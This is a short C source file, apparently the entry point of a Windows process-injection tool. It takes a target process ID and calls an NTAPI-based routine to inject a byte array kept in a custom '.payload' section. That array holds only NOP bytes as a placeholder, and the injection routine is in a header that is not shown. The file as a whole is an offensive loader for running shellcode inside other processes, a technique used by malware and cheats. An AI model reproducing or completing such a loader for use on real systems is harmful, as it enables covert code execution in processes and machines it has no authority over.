#include "fortnite.h"


#pragma section(".payload")
__declspec(allocate(".payload")) CONST UCHAR shellcode[] = {
        0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
        0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,
        0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90,0x90
};


int main(int argc, char* argv[]) {

    printBanner();
    if (argc < 2) {
        WARN("usage: \"%s\" [PID]", argv[0]);
        return EXIT_FAILURE;
    }

    if (!NTAPIInjection(atoi(argv[1]), (CONST PBYTE)shellcode, sizeof(shellcode))) {
        WARN("injection with NTAPI failed, exiting...");
        return EXIT_FAILURE;
    }

    OKAY("successfully injected process with NTAPI!");
    return EXIT_SUCCESS;

}